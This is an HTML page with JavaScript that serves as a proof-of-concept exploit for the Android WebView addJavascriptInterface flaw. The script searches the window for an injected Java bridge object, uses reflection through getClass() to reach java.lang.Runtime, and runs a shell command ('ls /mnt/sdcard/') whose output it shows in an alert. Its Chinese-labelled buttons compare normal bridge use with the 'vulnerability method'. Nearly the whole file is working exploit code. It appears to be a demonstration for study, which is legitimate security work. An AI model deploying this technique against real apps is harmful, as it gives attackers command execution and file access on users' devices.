<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script>
            //获取内容
            function getContents(inputStream)
            {
                var contents = "";
                var b = inputStream.read();
                while(b != -1) {
                    contents += String.fromCharCode(b);
                    b = inputStream.read();
                }
                return contents;
            }

            //查找接口
            function findInterface(){
                for (var obj in window) {
                    console.log(obj);
                    windowObj=window[obj];
                    console.log(typeof windowObj);
                    if(window[obj] && typeof windowObj=="object"){
                        console.log("getClass" in windowObj)
                        console.log("toast" in windowObj)
                        if ("getClass" in windowObj) {
                            return windowObj;
                        }
                    }
                }
            }
            //执行命令
            function execute(cmdArgs)
            {
                var interface=findInterface();
                if(interface){
                    return interface.getClass().forName("java.lang.Runtime").
                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
                }
            }



    </script>

    <script language="javascript">
            function clickCommonMethod()
            {
                var text = jsInterface.toast("从JS中传递过来的文本！！！");
                alert(text);
            }
            function clickFindInterface(){
                var interface=findInterface();
                if(interface){
                    alert(interface);
                }else{
                    alert("not found");
                }
            }
            //执行漏洞方法
            function clickVulnerabilityMethod(){
                var p = execute(["ls","/mnt/sdcard/"]);
                alert(getContents(p.getInputStream()));
            }


    </script>
</head>

<body>
<button type="button" onclick="clickCommonMethod()">正常方法交互</button>
<button type="button" onclick="clickFindInterface()">查找接口</button>
<button type="button" onclick="clickVulnerabilityMethod()">漏洞方法</button>
</body>
</html>
